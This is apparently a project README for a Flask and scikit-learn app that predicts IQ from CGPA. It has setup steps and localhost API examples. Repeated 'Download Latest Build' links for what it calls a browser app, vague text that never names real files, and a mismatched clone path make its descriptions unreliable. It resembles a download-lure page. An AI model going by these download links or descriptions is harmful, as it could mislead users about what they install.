# AI IQ Predictor - Machine Learning Web Application 2026

> **AI IQ Predictor is a browser-based machine learning application that uses CGPA to estimate IQ, place the result into a cognitive category, and display an automatically generated skill profile.**

[![Platform](https://img.shields.io/badge/Platform-Web-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-Latest-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/zackhallme5359/ai-iq-ml-predictor?style=flat-square)](https://github.com/zackhallme5359/ai-iq-ml-predictor)

---

<p align="center">
  <a href="https://zackhallme5359.github.io/ai-iq-ml-predictor/">
    <img src="https://img.shields.io/badge/Download-AI%20IQ%20Predictor%20Latest-brightgreen?style=for-the-badge" alt="Download AI IQ Predictor">
  </a>
</p>

> **[Download AI IQ Predictor Latest](https://zackhallme5359.github.io/ai-iq-ml-predictor/)**

---

[Download Latest Build](https://zackhallme5359.github.io/ai-iq-ml-predictor/)

---

## Overview

AI IQ Predictor explores a possible relationship between student CGPA values and predicted IQ scores. Its linear regression model is trained with student data, then maps each calculated estimate to a wider cognitive category.

A Flask backend powers the application while the frontend provides an interactive way to submit values and view results. In addition to the prediction itself, the interface can produce a skill profile and reveal returned values with a count-up animation.

---

## What It Provides

- Produces an IQ estimate from a submitted CGPA.
- Applies a student-data-trained linear regression model.
- Categorizes the predicted result using a cognitive classification.
- Creates a corresponding skill profile.
- Exposes prediction functionality through `/predict`.
- Includes a health endpoint for checking service availability.
- Presents results in an interactive frontend with count-up animation.
- Can be deployed using Vercel serverless infrastructure.

---

## Getting Started

First download the repository and enter its application directory:

```bash
git clone https://github.com/zackhallme5359/ai-iq-ml-predictor.git
cd AI-IQ-Predictor
```

Install the dependencies required by the project:

```bash
pip install -r requirements.txt
```

Run the Flask entry point:

```bash
python app.py
```

Once Flask starts, visit the local address printed in the terminal. To publish the application, prepare the project for Vercel and use the deployment URL provided by Vercel.

---

## Using the Application

### Browser workflow

1. Start the local server or visit the hosted application.
2. Type a CGPA value into the prediction form.
3. Submit the value for processing.
4. Inspect the estimated IQ, cognitive category, and generated skill profile.
5. Watch the result animation as the prediction is displayed.

### Prediction endpoint

The prediction service accepts the application's expected CGPA JSON input at `/predict`:

```bash
curl -X POST http://127.0.0.1:5000/predict \
  -H "Content-Type: application/json" \
  -d '{"cgpa": 8.5}'
```

The returned data includes the model's prediction together with its related classification information.

### Service health endpoint

Use `/health` to verify that the local service is answering requests:

```bash
curl http://127.0.0.1:5000/health
```

---

## Project Configuration

Flask settings and deployment behavior are defined by the files included in the project. Before starting the server or deploying, make sure that:

- The Flask entry point corresponds to the startup command.
- All packages from the requirements file are installed.
- The `/predict` and health-check routes are available.
- The Vercel project references the appropriate application entry point.
- Required model and student-data resources are included in the repository.

The project does not require a separate user configuration file unless its directory structure supplies one.

---

## Requirements

To run or deploy AI IQ Predictor, you need:

- A current web browser.
- Python compatible with the versions required by the project dependencies.
- Flask for the web layer.
- scikit-learn for linear regression.
- The student data and model resources used by the application.
- Internet connectivity for the hosted Vercel version.
- A Vercel account with the necessary serverless project configuration.

---

## Frequently Asked Questions

### What is AI IQ Predictor intended for?

The application is for exploring a CGPA-driven machine learning prediction through either an interactive browser interface or the API.

### Is the result a real IQ measurement?

No. The application generates an estimate from CGPA and student data. It is a model output and should not be considered a formal intelligence assessment.

### What is the process for updating the app?

Retrieve the newest repository changes, install dependencies again when they have been modified, and restart Flask. A Vercel deployment should be redeployed after updating the project.

### Which files control the input and model behavior?

Look through the Flask routes, model implementation, and data-processing files. Their exact locations are determined by the repository layout.

### What should I check if `/predict` returns an error?

Make sure the Flask server is active, the request contains the expected JSON format, and the CGPA value is valid. Application logs can also reveal dependency or model-loading problems.

### How do I verify that the service is running?

Call the health route:

```bash
curl http://127.0.0.1:5000/health
```

### How do I submit a bug report?

Create an issue in the repository and include the deployment environment, request information, and any useful error output.

---

## Roadmap

Planned improvements include:

- Streamlining the prediction flow and result display.
- Strengthening validation for model inputs.
- Making the generated skill profile more extensive.
- Providing more complete API documentation.
- Further improving deployment through Vercel.

---

## License

This project is distributed under the GNU GPL v3.0. See [LICENSE](LICENSE) for the full license details.
